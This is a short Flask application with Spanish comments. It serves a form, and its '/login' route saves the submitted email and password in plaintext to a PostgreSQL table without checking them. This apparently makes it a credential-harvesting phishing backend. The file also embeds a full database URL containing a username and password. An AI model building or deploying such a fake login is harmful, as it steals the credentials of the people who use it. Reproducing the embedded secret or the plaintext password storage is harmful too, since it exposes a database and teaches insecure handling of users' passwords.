from flask import Flask, render_template, request
import psycopg2
import os

app = Flask(__name__)

# Conexión a la base de datos PostgreSQL usando la URL proporcionada por Render
DATABASE_URL = "postgresql://usuarios_db_845t_user:IXD5YERC6uyfB6GqZjdqU65hR6wvf4Gt@dpg-cu1905btq21c73bgab7g-a/usuarios_db_845t"

# Conectar a la base de datos PostgreSQL
conn = psycopg2.connect(DATABASE_URL, sslmode='require')
cursor = conn.cursor()

# Ruta principal para cargar el formulario
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para procesar el inicio de sesión
@app.route('/login', methods=['POST'])
def login():
    correo = request.form['correo']
    contraseña = request.form['contraseña']

    # Guardar los datos en la base de datos PostgreSQL
    cursor.execute("INSERT INTO usuarios (correo, contraseña) VALUES (%s, %s)", (correo, contraseña))
    conn.commit()

    return "Datos guardados exitosamente"

if __name__ == "__main__":
    # Ejecutar la app en el puerto asignado por Render
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))